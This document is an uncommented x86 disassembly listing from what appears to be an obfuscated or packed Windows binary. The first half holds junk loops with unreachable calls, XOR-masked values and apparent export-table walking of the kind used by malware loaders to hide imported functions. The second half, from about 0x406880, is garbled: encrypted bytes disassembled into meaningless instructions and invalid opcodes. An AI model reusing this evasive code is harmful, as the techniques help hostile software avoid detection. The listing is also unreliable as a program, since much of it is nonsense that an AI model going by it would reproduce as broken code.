  4062e7:	test   eax,eax
  4062e9:	je     0x40635d
  4062ef:	mov    DWORD PTR ds:0x42b1b6,0x13
  4062f9:	cmp    DWORD PTR ds:0x42b1b6,0x0
  406300:	je     0x40634f
  406306:	cmp    DWORD PTR ds:0x42b1b6,0x3
  40630d:	jle    0x40634f
  406313:	jmp    0x406323
  406318:	push   0x8d96
  40631d:	call   DWORD PTR ds:0x42b326
  406323:	cmp    DWORD PTR ds:0x42b1b6,0x4
  40632a:	jne    0x40633d
  406330:	mov    ebx,DWORD PTR ds:0x42b1b6
  406336:	dec    ebx
  406337:	mov    DWORD PTR ds:0x42b1b6,ebx
  40633d:	mov    ebx,DWORD PTR ds:0x42b1b6
  406343:	dec    ebx
  406344:	mov    DWORD PTR ds:0x42b1b6,ebx
  40634a:	jmp    0x4062f9
  40634f:	mov    eax,DWORD PTR [ebp+0x14]
  406352:	sbb    DWORD PTR ds:0x42b1ba,edx
  406358:	mov    eax,DWORD PTR [eax]
  40635a:	mov    DWORD PTR [ebp-0x1c],eax
  40635d:	and    ebx,DWORD PTR ds:0x42b1fa
  406363:	mov    eax,DWORD PTR [ebp-0x4]
  406366:	xor    eax,esi
  406368:	mov    DWORD PTR ds:0x42b22a,0x1f
  406372:	cmp    DWORD PTR ds:0x42b22a,0x0
  406379:	je     0x4063c1
  40637f:	cmp    DWORD PTR ds:0x42b22a,0x2a
  406386:	jg     0x4063c1
  40638c:	jmp    0x4063af
  406391:	push   0x42a061
  406396:	push   0x44b1
  40639b:	push   DWORD PTR [ebp-0x1c]
  40639e:	push   DWORD PTR [ebp-0x18]
  4063a1:	push   DWORD PTR [ebp-0x1c]
  4063a4:	push   0x7663
  4063a9:	call   DWORD PTR ds:0x42b2ea
  4063af:	mov    ebx,DWORD PTR ds:0x42b22a
  4063b5:	dec    ebx
  4063b6:	mov    DWORD PTR ds:0x42b22a,ebx
  4063bc:	jmp    0x406372
  4063c1:	add    eax,edi
  4063c3:	mov    DWORD PTR [ebp-0x8],eax
  4063c6:	sub    eax,eax
  4063c8:	mov    eax,DWORD PTR [ebp-0xc]
  4063cb:	add    DWORD PTR ds:0x42b196,ecx
  4063d1:	xor    eax,esi
  4063d3:	adc    ebx,DWORD PTR ds:0x42b1aa
  4063d9:	add    eax,edi
  4063db:	add    ebx,DWORD PTR ds:0x42b186
  4063e1:	mov    DWORD PTR [ebp-0x24],eax
  4063e4:	mov    eax,DWORD PTR [ebp-0x4]
  4063e7:	add    ebx,DWORD PTR ds:0x42b1ba
  4063ed:	xor    eax,esi
  4063ef:	and    DWORD PTR ds:0x42b19e,0x0
  4063f9:	jmp    0x40640b
  4063fe:	mov    ebx,DWORD PTR ds:0x42b19e
  406404:	inc    ebx
  406405:	mov    DWORD PTR ds:0x42b19e,ebx
  40640b:	cmp    DWORD PTR ds:0x42b19e,0x1e
  406412:	jae    0x406444
  406418:	cmp    DWORD PTR ds:0x42b19e,0x27
  40641f:	ja     0x406444
  406425:	jmp    0x40643f
  40642a:	push   0x42a061
  40642f:	push   DWORD PTR [ebp-0x20]
  406432:	push   0x0
  406434:	push   0x6ce9
  406439:	call   DWORD PTR ds:0x42b2ee
  40643f:	jmp    0x4063fe
  406444:	add    eax,edi
  406446:	mov    DWORD PTR [ebp-0x30],eax
  406449:	movzx  ebx,BYTE PTR ds:0x42b22e
  406450:	add    ebx,DWORD PTR ds:0x42b1c6
  406456:	mov    DWORD PTR ds:0x42b22e,ebx
  40645c:	mov    ebx,DWORD PTR [ebp-0x4]
  40645f:	xor    ebx,esi
  406461:	mov    eax,ds:0x42b1da
  406466:	or     DWORD PTR ds:0x42b1ee,eax
  40646c:	add    ebx,edi
  40646e:	and    DWORD PTR ds:0x42b1b2,0x0
  406478:	mov    eax,ds:0x42b1b2
  40647d:	inc    eax
  40647e:	mov    ds:0x42b1b2,eax
  406483:	cmp    DWORD PTR ds:0x42b1b2,0x1f
  40648a:	jg     0x4064ab
  406490:	jmp    0x40649e
  406495:	push   DWORD PTR [ebp-0x1c]
  406498:	call   DWORD PTR ds:0x42b2f2
  40649e:	cmp    DWORD PTR ds:0x42b1b2,0x17
  4064a5:	jb     0x406478
  4064ab:	mov    eax,DWORD PTR [ebp-0x24]
  4064ae:	and    DWORD PTR ds:0x42b1e2,0x6649
  4064b8:	sub    eax,edi
  4064ba:	sub    DWORD PTR ds:0x42b22e,0x1376
  4064c4:	lea    ecx,[ebx-0x3272f5]
  4064ca:	xor    DWORD PTR ds:0x42b212,0x3b15
  4064d4:	xor    eax,esi
  4064d6:	adc    DWORD PTR ds:0x42b216,0x7bbc
  4064e0:	xor    ecx,esi
  4064e2:	cmp    ecx,eax
  4064e4:	je     0x40678a
  4064ea:	mov    eax,ds:0x42b18a
  4064ef:	sbb    eax,DWORD PTR ds:0x42b192
  4064f5:	mov    ds:0x42b18a,eax
  4064fa:	mov    eax,DWORD PTR [ebp-0x4]
  4064fd:	xor    eax,esi
  4064ff:	add    eax,edi
  406501:	mov    DWORD PTR ds:0x42b21e,0x72e1
  40650b:	cmp    ebx,eax
  40650d:	mov    DWORD PTR ds:0x42b202,0xd47
  406517:	jne    0x406767
  40651d:	xor    DWORD PTR ds:0x42b1f2,0x42b1b6
  406527:	push   DWORD PTR [ebp+0x8]
  40652a:	call   0x424022
  40652f:	xor    DWORD PTR ds:0x42b1b2,edx
  406535:	mov    DWORD PTR [ebp-0x14],eax
  406538:	mov    ecx,DWORD PTR ds:0x42b296
  40653e:	mov    ecx,DWORD PTR [ecx]
  406540:	sbb    DWORD PTR ds:0x42b1f6,ecx
  406546:	mov    eax,DWORD PTR [ebp-0x4]
  406549:	sbb    DWORD PTR ds:0x42b1d6,ecx
  40654f:	mov    ecx,DWORD PTR [ebp-0x14]
  406552:	xor    eax,esi
  406554:	add    eax,edi
  406556:	mov    DWORD PTR ds:0x42b226,0x75db
  406560:	cmp    ecx,eax
  406562:	je     0x4067f5
  406568:	push   DWORD PTR [ebp-0x14]
  40656b:	push   DWORD PTR [ebp+0x8]
  40656e:	mov    DWORD PTR ds:0x42b196,0x32ca
  406578:	call   0x424138
  40657d:	mov    DWORD PTR [ebp-0x14],eax
  406580:	adc    DWORD PTR ds:0x42b18a,ecx
  406586:	mov    eax,DWORD PTR [ebp-0x4]
  406589:	adc    DWORD PTR ds:0x42b186,ecx
  40658f:	mov    ecx,DWORD PTR [ebp-0x14]
  406592:	sub    DWORD PTR ds:0x42b1e6,0x42b196
  40659c:	xor    eax,esi
  40659e:	adc    DWORD PTR ds:0x42b212,0x42b1f6
  4065a8:	add    eax,edi
  4065aa:	cmp    ecx,eax
  4065ac:	mov    DWORD PTR ds:0x42b1da,0x7670
  4065b6:	je     0x4067f5
  4065bc:	xor    eax,eax
  4065be:	add    eax,DWORD PTR ds:0x42b19a
  4065c4:	and    eax,DWORD PTR ds:0x42b1be
  4065ca:	mov    ds:0x42b19a,eax
  4065cf:	mov    eax,DWORD PTR [ebp-0x14]
  4065d2:	mov    eax,DWORD PTR [eax+0x18]
  4065d5:	and    DWORD PTR ds:0x42b1e2,0x0
  4065df:	jmp    0x4065f1
  4065e4:	mov    ecx,DWORD PTR ds:0x42b1e2
  4065ea:	inc    ecx
  4065eb:	mov    DWORD PTR ds:0x42b1e2,ecx
  4065f1:	cmp    DWORD PTR ds:0x42b1e2,0x13
  4065f8:	jae    0x40663a
  4065fe:	cmp    DWORD PTR ds:0x42b1e2,0x9
  406605:	jb     0x40663a
  40660b:	jmp    0x40661b
  406610:	push   0x42b206
  406615:	call   DWORD PTR ds:0x42b2f6
  40661b:	cmp    DWORD PTR ds:0x42b1e2,0x8
  406622:	jne    0x406635
  406628:	mov    ecx,DWORD PTR ds:0x42b1e2
  40662e:	inc    ecx
  40662f:	mov    DWORD PTR ds:0x42b1e2,ecx
  406635:	jmp    0x4065e4
  40663a:	mov    DWORD PTR [ebp-0x24],eax
  40663d:	mov    eax,DWORD PTR [ebp-0x14]
  406640:	mov    ecx,DWORD PTR ds:0x42b1c2
  406646:	adc    ecx,DWORD PTR ds:0x42b1b2
  40664c:	mov    DWORD PTR ds:0x42b1c2,ecx
  406652:	mov    ecx,DWORD PTR [ebp+0x8]
  406655:	or     DWORD PTR ds:0x42b1f6,0x7077
  40665f:	add    ecx,DWORD PTR [eax+0x20]
  406662:	and    eax,0x7368
  406667:	mov    DWORD PTR [ebp-0x2c],ecx
  40666a:	mov    eax,DWORD PTR [ebp-0x14]
  40666d:	and    DWORD PTR ds:0x42b21a,0x0
  406677:	jmp    0x40668b
  40667c:	xor    ecx,ecx
  40667e:	or     ecx,DWORD PTR ds:0x42b21a
  406684:	inc    ecx
  406685:	mov    DWORD PTR ds:0x42b21a,ecx
  40668b:	cmp    DWORD PTR ds:0x42b21a,0x1c
  406692:	jae    0x4066e3
  406698:	cmp    DWORD PTR ds:0x42b21a,0x5
  40669f:	jbe    0x4066e3
  4066a5:	jmp    0x4066c4
  4066aa:	push   0x42b1f6
  4066af:	push   0x42b18e
  4066b4:	push   0x52aa
  4066b9:	push   0x42a0fe
  4066be:	call   DWORD PTR ds:0x42b2fa
  4066c4:	cmp    DWORD PTR ds:0x42b21a,0x4
  4066cb:	jne    0x4066de
  4066d1:	mov    ecx,DWORD PTR ds:0x42b21a
  4066d7:	inc    ecx
  4066d8:	mov    DWORD PTR ds:0x42b21a,ecx
  4066de:	jmp    0x40667c
  4066e3:	mov    ecx,DWORD PTR [ebp+0x8]
  4066e6:	add    ecx,DWORD PTR [eax+0x24]
  4066e9:	mov    DWORD PTR [ebp-0x34],ecx
  4066ec:	adc    DWORD PTR ds:0x42b212,0x34a6
  4066f6:	mov    eax,DWORD PTR [ebp-0x14]
  4066f9:	and    DWORD PTR ds:0x42b192,0x0
  406703:	mov    ecx,DWORD PTR ds:0x42b192
  406709:	inc    ecx
  40670a:	mov    DWORD PTR ds:0x42b192,ecx
  406710:	cmp    DWORD PTR ds:0x42b192,0x4
  406717:	jbe    0x406759
  40671d:	jmp    0x406732
  406722:	push   0x42b1b6
  406727:	push   0x42a2a1
  40672c:	call   DWORD PTR ds:0x42b2fe
  406732:	cmp    DWORD PTR ds:0x42b192,0x3
  406739:	jne    0x40674c
  40673f:	mov    ecx,DWORD PTR ds:0x42b192
  406745:	inc    ecx
  406746:	mov    DWORD PTR ds:0x42b192,ecx
  40674c:	cmp    DWORD PTR ds:0x42b192,0x13
  406753:	jb     0x406703
  406759:	mov    ecx,DWORD PTR [ebp+0x8]
  40675c:	add    ecx,DWORD PTR [eax+0x1c]
  40675f:	mov    DWORD PTR [ebp-0x14],ecx
  406762:	jmp    0x4067bd
  406767:	mov    eax,DWORD PTR [ebp-0x2c]
  40676a:	mov    ecx,DWORD PTR [ebp+0x8]
  40676d:	add    ecx,DWORD PTR [eax+ebx*4]
  406770:	mov    DWORD PTR [ebp-0x28],ecx
  406773:	mov    eax,DWORD PTR [ebp-0x4]
  406776:	mov    ecx,DWORD PTR [ebp-0x28]
  406779:	xor    eax,esi
  40677b:	add    eax,edi
  40677d:	cmp    ecx,eax
  40677f:	je     0x4067bd
  406785:	jmp    0x4067ae
  40678a:	mov    eax,DWORD PTR [ebp-0x4]
  40678d:	mov    ecx,DWORD PTR [ebp-0x8]
  406790:	xor    eax,esi
  406792:	add    eax,edi
  406794:	cmp    ecx,eax
  406796:	mov    eax,DWORD PTR [ebp-0x4]
  406799:	je     0x4067f8
  40679f:	mov    ecx,DWORD PTR [ebp-0x30]
  4067a2:	xor    eax,esi
  4067a4:	add    eax,edi
  4067a6:	cmp    ecx,eax
  4067a8:	je     0x406801
  4067ae:	lea    eax,[ebp-0x8]
  4067b1:	push   eax
  4067b2:	push   DWORD PTR [ebp-0x28]
  4067b5:	push   DWORD PTR [ebp+0xc]
  4067b8:	call   0x40f847
  4067bd:	mov    eax,DWORD PTR [ebp-0x4]
  4067c0:	mov    ecx,DWORD PTR [ebp-0x8]
  4067c3:	xor    eax,esi
  4067c5:	add    eax,edi
  4067c7:	cmp    ecx,eax
  4067c9:	je     0x4067e4
  4067cf:	mov    eax,DWORD PTR [ebp-0x34]
  4067d2:	movzx  eax,WORD PTR [eax+ebx*2]
  4067d6:	mov    ecx,DWORD PTR [ebp-0x14]
  4067d9:	mov    eax,DWORD PTR [ecx+eax*4]
  4067dc:	mov    DWORD PTR [ebp-0x38],eax
  4067df:	jmp    0x40678a
  4067e4:	mov    eax,DWORD PTR [ebp-0xc]
  4067e7:	xor    eax,esi
  4067e9:	lea    ebx,[ebx+eax*1+0x3272f5]
  4067f0:	jmp    0x40646e
  4067f5:	mov    eax,DWORD PTR [ebp-0x4]
  4067f8:	xor    eax,esi
  4067fa:	add    eax,edi
  4067fc:	jmp    0x40f768
  406801:	mov    eax,DWORD PTR [ebp-0x38]
  406804:	add    eax,DWORD PTR [ebp+0x8]
  406807:	mov    DWORD PTR [ebp-0x18],eax
  40680a:	mov    eax,DWORD PTR [ebp-0x1c]
  40680d:	test   eax,eax
  40680f:	je     0x40afcd
  406815:	mov    DWORD PTR [ebp-0x20],0x0
  40681c:	push   0x3
  40681e:	xor    edx,edx
  406820:	pop    edx
  406821:	add    edx,0x8
  406824:	push   edx
  406825:	pop    ecx
  406826:	push   0x6
  406828:	dec    ecx
  406829:	pop    ebx
  40682a:	dec    ebx
  40682b:	xchg   ebx,ecx
  40682d:	sub    ebx,ecx
  40682f:	xchg   ebx,ecx
  406831:	dec    ecx
  406832:	mov    eax,DWORD PTR [ebp-0x1c]
  406835:	imul   eax,ecx
  406838:	sub    esp,eax
  40683a:	mov    DWORD PTR [ebp-0x20],esp
  40683d:	mov    eax,DWORD PTR [ebp-0x4]
  406840:	xor    eax,esi
  406842:	add    eax,edi
  406844:	jmp    0x408c14
  406849:	mov    ecx,DWORD PTR [ebp-0xc]
  40684c:	mov    eax,DWORD PTR [ebp+0x8]
  40684f:	mov    edx,DWORD PTR [ebp+0x14]
  406852:	mov    eax,DWORD PTR [edx+eax*4+0x4]
  406856:	xor    ecx,esi
  406858:	add    ecx,edi
  40685a:	xor    edx,edx
  40685c:	div    ecx
  40685e:	mov    ecx,DWORD PTR [ebp-0x4]
  406861:	xor    ecx,esi
  406863:	lea    eax,[ecx+eax*1+0x3272f5]
  40686a:	mov    ecx,DWORD PTR [ebp+0x8]
  40686d:	mov    edx,DWORD PTR [ebp-0x20]
  406870:	mov    DWORD PTR [edx+ecx*4],eax
  406873:	mov    eax,DWORD PTR [ebp-0xc]
  406876:	mov    ecx,DWORD PTR [ebp+0x8]
  406879:	xor    eax,esi
  40687b:	jmp    0x408c0d
  406880:	mov    ebx,0x2cc0cea
  406885:	mov    bh,BYTE PTR [ebx-0x264bb77e]
  40688b:	pop    esi
  40688c:	xlat   BYTE PTR ds:[ebx]
  40688d:	push   ecx
  40688e:	stc    
  40688f:	inc    esi
  406890:	adc    edi,DWORD PTR ds:0x5e0c8383
  406896:	add    DWORD PTR [ebx+0x5378e6d2],0x51
  40689d:	adc    esi,esp
  40689f:	pop    es
  4068a0:	xchg   esi,eax
  4068a1:	and    ah,BYTE PTR [esi+0x276a91ed]
  4068a7:	pop    esi
  4068a8:	aam    0x9a
  4068aa:	push   esp
  4068ab:	popa   
  4068ac:	idiv   BYTE PTR [ebp-0x54]
  4068af:	jne    0x406919
  4068b1:	adc    edi,ebp
  4068b3:	paddd  mm6,QWORD PTR [ebp-0x4f0f47c8]
  4068ba:	loop   0x40686c
  4068bc:	fsubrp st(3),st
  4068be:	jns    0x40688a
  4068c0:	data16 stos BYTE PTR es:[edi],al
  4068c2:	int3   
  4068c3:	cmc    
  4068c4:	clc    
  4068c5:	imul   ebp,ebx,0x4163fc11
  4068cb:	in     eax,dx
  4068cc:	mov    cl,0x3e
  4068ce:	repz fisubr WORD PTR [ebx-0x4]
  4068d2:	(bad)  
  4068d3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4068d4:	das    
  4068d5:	pop    ecx
  4068d6:	repz fld DWORD PTR [ebp-0xf]
  4068da:	or     al,BYTE PTR [ebx-0x4a4a9942]
  4068e0:	popf   
  4068e1:	retf   0x854b
  4068e4:	mov    ds:0x5ea3043e,al
  4068e9:	not    BYTE PTR [edx-0x6e]
  4068ec:	cs pop esi
  4068ee:	push   es
  4068ef:	std    
  4068f0:	sbb    al,0xe0
  4068f2:	push   cs
  4068f3:	xor    dh,BYTE PTR [ebx+0x2]
  4068f6:	pop    ebp
  4068f7:	push   ss
  4068f8:	jns    0x4068dd
  4068fa:	pop    esp
  4068fb:	mov    BYTE PTR [ebx-0xa3e5b7a],dh
  406901:	sbb    BYTE PTR [edx],ah
  406903:	mov    BYTE PTR [ebx+ebp*4-0x2820f1fd],al
  40690a:	test   BYTE PTR [ecx],0xff
  40690d:	add    ebx,DWORD PTR [edi]
  40690f:	pop    esi
  406910:	out    dx,eax
  406911:	es dec edi
  406913:	loop   0x4068fa
  406915:	xor    al,0xc7
  406917:	sbb    BYTE PTR [ebx+ebp*4-0x5362e623],ah
  40691e:	adc    BYTE PTR [ebx-0x55],cl
  406921:	(bad)  
  406922:	pop    esi
  406923:	ror    BYTE PTR [edi-0x5a2492ce],1
  406929:	dec    esi
  40692a:	jl     0x406965
  40692c:	sub    edx,DWORD PTR [edi+0x7ffdc613]
  406932:	jb     0x406933
  406934:	cli    
  406935:	mov    edx,0x8278509e
  40693a:	sar    DWORD PTR [ebp*1-0x23066d11],cl
  406941:	dec    ebx
  406942:	inc    edi
  406943:	(bad)  
  406944:	push   ecx
  406945:	cli    
  406946:	(bad)  
  406947:	fild   QWORD PTR [esi+0x22]
  40694a:	push   esi
  40694b:	jge    0x4069b0
  40694d:	je     0x406972
  40694f:	add    al,0x47
  406951:	xchg   cl,bh
  406953:	add    DWORD PTR [esi],eax
  406955:	das    
  406956:	xchg   ebp,eax
  406957:	into   
  406958:	icebp  
  406959:	std    
  40695a:	(bad)  
  40695b:	loopne 0x4068f4
  40695d:	sbb    eax,0x24f36264
  406962:	scas   eax,DWORD PTR es:[edi]
  406963:	lea    ebx,[ebx+edx*8-0x51b0e63c]
  40696a:	or     al,0xc3
  40696c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40696d:	loope  0x406944
  40696f:	icebp  
  406970:	sti    
  406971:	(bad)  
  406972:	fwait
  406973:	ja     0x406970
  406975:	lods   eax,DWORD PTR ds:[esi]
  406976:	ins    BYTE PTR es:[edi],dx
  406977:	push   edx
  406978:	cmp    bh,al
  40697a:	mov    dl,0xa2
  40697c:	js     0x406990
  40697e:	push   0xd61b7cb6
  406983:	dec    edx
  406984:	rcl    BYTE PTR [ebx+0x3b50180c],cl
  40698a:	jnp    0x4069ee
  40698c:	daa    
  40698d:	adc    BYTE PTR [ecx+0x464caed4],ah
  406993:	dec    ebp
  406994:	jl     0x4069c5
  406996:	pop    DWORD PTR [eax+0x6dc5b68e]
  40699c:	cld    
  40699d:	jge    0x4069ae
  40699f:	xlat   BYTE PTR ds:[ebx]
  4069a0:	cld    
  4069a1:	mov    WORD PTR [eax+0x43],?
  4069a4:	adc    eax,0x26802faa
  4069a9:	xor    eax,0x2dc77f08
  4069ae:	push   ecx
  4069af:	mov    ds:0xe2682fd0,al
  4069b4:	add    eax,0x34639bca
  4069b9:	in     al,0xa
  4069bb:	into   
  4069bc:	inc    esi
  4069bd:	fld    DWORD PTR [ecx-0x79]
  4069c0:	add    eax,0x967a99af
  4069c5:	aaa    
  4069c6:	fwait
  4069c7:	sbb    cl,dh
  4069c9:	xor    al,0x89
  4069cb:	addr16 push edx
  4069cd:	in     eax,0x8b
  4069cf:	pop    ecx
  4069d0:	jnp    0x40695e
  4069d2:	jo     0x406a25
  4069d4:	js     0x406a1a
  4069d6:	xor    eax,0xd3ef5058
  4069db:	pop    es
  4069dc:	mov    DWORD PTR [esi+0x13dffcd1],edx
  4069e2:	lods   eax,DWORD PTR ds:[esi]
  4069e3:	mov    dh,0xd6
  4069e6:	fidiv  DWORD PTR [ecx+eiz*8-0x47fbe58a]
  4069ed:	retf   
  4069ee:	loopne 0x406a45
  4069f0:	jns    0x406a0c
  4069f2:	push   0x7a
  4069f4:	ror    DWORD PTR [ebp-0x2b354160],1
  4069fa:	sar    DWORD PTR [ecx+0x4f],cl
  4069fd:	lds    edx,FWORD PTR ds:0xd5dadb0
  406a03:	pop    edx
  406a04:	fld    DWORD PTR [ecx-0x196d5e4b]
  406a0a:	inc    esp
  406a0b:	dec    eax
  406a0c:	xor    DWORD PTR [ecx],esp
  406a0e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406a0f:	xor    eax,0x94ed58e7
  406a14:	xor    dh,bl
  406a16:	(bad)  
  406a17:	jne    0x406a23
  406a19:	int3   
  406a1a:	test   eax,0x676f84b8
  406a1f:	inc    edx
  406a20:	xchg   ecx,eax
  406a21:	mov    al,ds:0x586b67b5
  406a26:	retf   0xe249
  406a29:	push   eax
  406a2a:	pop    edi
  406a2b:	xchg   edi,eax
  406a2c:	loopne 0x406a25
  406a2e:	xor    al,0x97
  406a30:	cli    
  406a31:	shl    BYTE PTR [ecx+0x0],0xcb
  406a35:	dec    ebp
  406a36:	cwde   
  406a37:	dec    ebp
  406a38:	mov    ds:0x3e9ae192,al
  406a3d:	push   ss
  406a3e:	mov    ds:0xa9bdf8bd,al
  406a43:	sbb    eax,DWORD PTR [ebp+eax*1-0x11]
  406a47:	xchg   ebp,eax
  406a48:	pop    ebx
  406a49:	dec    esp
  406a4a:	fstp   DWORD PTR [edx+ebx*8]
  406a4d:	mov    ?,WORD PTR [edi+0x2a]
  406a50:	lods   al,BYTE PTR ds:[esi]
  406a51:	dec    edx
  406a52:	xchg   ebp,eax
  406a53:	bound  ebp,QWORD PTR ds:0x87febb2c
  406a59:	add    DWORD PTR [edx-0x2f],edx
  406a5c:	pusha  
  406a5d:	ja     0x406a14
  406a5f:	mov    bh,0xbe
  406a61:	fimul  WORD PTR [ebp+0x38]
  406a64:	and    BYTE PTR [ecx+0x3d3582fb],0x8b
  406a6b:	cli    
  406a6c:	mov    eax,ds:0x44209ff8
  406a71:	test   BYTE PTR [ecx+esi*4],ch
  406a74:	call   0xa063b8c2
  406a79:	fnstcw WORD PTR es:[esi]
  406a7c:	sub    al,0x62
  406a7e:	ins    DWORD PTR es:[edi],dx
  406a7f:	test   BYTE PTR [esp+edi*1-0x5eb3e329],bh
  406a86:	retf   0xa800
  406a89:	(bad)  
  406a8a:	jl     0x406a11
  406a8c:	in     eax,0x19
  406a8e:	inc    esp
  406a8f:	and    ecx,DWORD PTR [ecx-0x26]
  406a92:	popa   
  406a93:	(bad)  
  406a95:	xchg   edx,eax
  406a96:	(bad)
  406a99:	push   ecx
  406a9a:	loopne 0x406a7c
  406a9c:	test   al,0xcd
  406a9e:	push   edx
  406a9f:	leave  
  406aa0:	(bad)  
  406aa1:	mov    eax,ds:0x5fa2e8aa
  406aa6:	sub    dl,BYTE PTR [esp+ecx*2-0x2c]
  406aaa:	rol    BYTE PTR [ecx+0x4785d67a],0xf
  406ab1:	pop    edi
  406ab2:	popa   
  406ab3:	sub    cl,BYTE PTR [edx-0x67571e71]
  406ab9:	test   BYTE PTR [ebx],ch
  406abb:	loope  0x406b06
  406abd:	sbb    eax,0xb3afbce1
  406ac2:	pop    ss
  406ac3:	rcr    BYTE PTR [edx],cl
  406ac5:	jno    0x406a71
  406ac7:	push   ds
  406ac8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406ac9:	addr16 iret 
  406acb:	mov    edx,0x806dad27
  406ad0:	les    esi,FWORD PTR [esp+eax*1+0x35a324de]
  406ad7:	adc    esp,DWORD PTR [edx]
  406ad9:	pop    ebx
  406ada:	mov    ds:0x3b09172f,eax
  406adf:	jmp    0x56a5:0x52a71140
  406ae6:	jmp    0xc3a2bd7c
  406aeb:	adc    edi,DWORD PTR [edx+0x1d]
  406aee:	mov    ecx,0x532ec223
  406af3:	hlt    
  406af4:	dec    esi
  406af5:	pop    eax
  406af6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406af7:	ret    
  406af8:	adc    DWORD PTR [edi+edx*1+0x5a],0xffffffc3
  406afd:	lock (bad) 
  406aff:	mov    al,BYTE PTR [edi+ebx*2+0x17340d88]
  406b06:	fidivr DWORD PTR [ecx+edx*4-0x64]
  406b0a:	xchg   esi,eax
  406b0b:	nop
  406b0c:	jbe    0x406ac7
  406b0e:	sub    eax,0x13bc8745
  406b13:	mov    ecx,DWORD PTR ds:0x6d11ea57
  406b19:	dec    ebp
  406b1a:	push   cs
  406b1b:	outs   dx,BYTE PTR ds:[esi]
  406b1c:	je     0x406b3d
  406b1e:	fsub   DWORD PTR [edx-0x28]
  406b21:	jne    0x406b10
  406b23:	mov    DWORD PTR [edx+0x44],eax
  406b26:	test   BYTE PTR [ecx-0x4cbbbd45],bh
  406b2c:	lods   eax,DWORD PTR ds:[esi]
  406b2d:	ins    BYTE PTR es:[edi],dx
  406b2e:	jmp    0xffda335d
  406b33:	or     eax,0x467fc6db
  406b38:	out    dx,eax
  406b39:	pop    es
  406b3a:	ins    DWORD PTR es:[edi],dx
  406b3b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406b3c:	fs cwde 
  406b3e:	add    DWORD PTR cs:[ebp+0x6a],ebp
  406b42:	mov    al,0x71
  406b44:	gs sbb al,0xa
  406b47:	in     al,dx
  406b48:	inc    BYTE PTR [ebx-0x64]
  406b4b:	mov    edi,edi
  406b4d:	and    ebx,DWORD PTR [ebp-0x3c71199b]
  406b53:	jge    0x406b35
  406b55:	call   0x2d9f:0x8fe9f30f
  406b5c:	mov    bh,0x36
  406b5e:	mov    ah,0x89
  406b60:	fcmovne st,st(4)
  406b62:	mov    ebx,0xde9aef13
  406b67:	pop    ds
  406b68:	inc    edx
  406b69:	mov    gs,WORD PTR [edx]
  406b6b:	sub    al,0xd9
  406b6d:	out    dx,al
  406b6e:	test   al,0x1c
  406b70:	adc    ebx,edx
  406b72:	mov    dl,0x4f
  406b74:	push   ebx
  406b75:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406b76:	mov    cl,0x6a
  406b78:	(bad)  
  406b7a:	retf   0xe2ba
  406b7d:	pusha  
  406b7e:	sub    DWORD PTR [esi+0x5f],ebp
  406b81:	test   BYTE PTR [ebp+0x57],dl
  406b84:	jmp    0x341e:0xe741e433
  406b8b:	add    al,BYTE PTR ds:0x1d1d3c61
  406b91:	push   0x5d
  406b93:	sbb    dl,dh
  406b95:	xor    ecx,ebp
  406b97:	sub    dh,BYTE PTR [edx+ebx*2-0x21c597ab]
  406b9e:	dec    ebx
  406b9f:	mov    eax,0xd698a13d
  406ba4:	pop    esp
  406ba5:	push   cs
  406ba6:	cmp    DWORD PTR [ecx],esp
  406ba8:	js     0x406b52
  406baa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406bab:	ja     0x406ba9
  406bad:	dec    ecx
  406bae:	and    eax,0x73d63cd2
  406bb3:	ins    BYTE PTR es:[edi],dx
  406bb4:	mov    bl,0x63
  406bb6:	shl    BYTE PTR [ebx+0x7c],1
  406bb9:	inc    ecx
  406bba:	or     eax,0x557ccf7a
  406bbf:	sbb    dl,al
  406bc1:	cs inc edi
  406bc3:	fmul   QWORD PTR [esi-0x7e]
  406bc6:	mov    eax,0xce0750e
  406bcb:	mov    eax,0x74c98cf3
  406bd0:	fisttp WORD PTR [esp+esi*2-0x6e]
  406bd4:	push   ecx
  406bd5:	test   DWORD PTR [edi-0x74],esp
  406bd8:	sub    edi,DWORD PTR ds:0xc27f4540
  406bde:	ins    BYTE PTR es:[edi],dx
  406bdf:	test   DWORD PTR [ebx+edi*1-0x51cf3c26],edi
  406be6:	pop    esp
  406be7:	push   ds
  406be8:	mov    ds:0x15b87a64,eax
  406bed:	jp     0x406bf5
  406bef:	push   DWORD PTR [edi]
  406bf1:	call   0xe795:0x35ad92d6
  406bf8:	xchg   BYTE PTR [esp+ebx*1],al
  406bfb:	dec    esp
  406bfc:	push   eax
  406bfd:	dec    esi
  406bfe:	fld    TBYTE PTR [esi-0x59]
  406c01:	gs (bad) 
  406c03:	into   
  406c04:	and    al,0xdc
  406c06:	jle    0x406bb2
  406c08:	mov    ch,0x63
  406c0a:	push   ecx
  406c0b:	test   BYTE PTR [ebx-0x7c],ah
  406c0e:	in     eax,0x97
  406c10:	inc    edx
  406c11:	pop    ecx
  406c12:	mov    ebp,0xe01e574e
  406c17:	mov    esi,0xaf576ff2
  406c1c:	dec    ebx
  406c1d:	sub    ebp,DWORD PTR [ebp+0x3c07afe8]
  406c23:	adc    ebx,eax
  406c25:	sub    eax,ebp
  406c27:	jbe    0x406bb8
  406c29:	out    dx,al
  406c2a:	sar    DWORD PTR [eax+0x4d6ab218],cl
  406c30:	int3   
  406c31:	mov    bh,dh
  406c33:	cmp    bl,dh
  406c35:	sub    bh,BYTE PTR [ecx]
  406c37:	in     eax,dx
  406c38:	xchg   edi,eax
  406c39:	je     0x406c26
  406c3b:	sbb    DWORD PTR [edi-0x47],edx
  406c3e:	pusha  
  406c3f:	jmp    0x4d2b:0x3f8f3447
  406c46:	dec    ecx
  406c47:	jp     0x406bd7
  406c49:	mov    edi,0x17f21240
  406c4e:	pop    edi
  406c4f:	outs   dx,DWORD PTR ds:[esi]
  406c50:	xchg   ebx,eax
  406c51:	cli    
  406c52:	loopne 0x406c86
  406c54:	and    edi,DWORD PTR [eax+eiz*1-0x556bb4e1]
  406c5b:	cmp    eax,0x30996865
  406c60:	xor    al,0x84
  406c62:	pop    ds
  406c63:	mov    bh,0x20
  406c65:	and    DWORD PTR [ebp-0x21b4c83c],ebp
  406c6b:	xor    dl,al
  406c6d:	out    0x9f,eax
  406c6f:	dec    eax
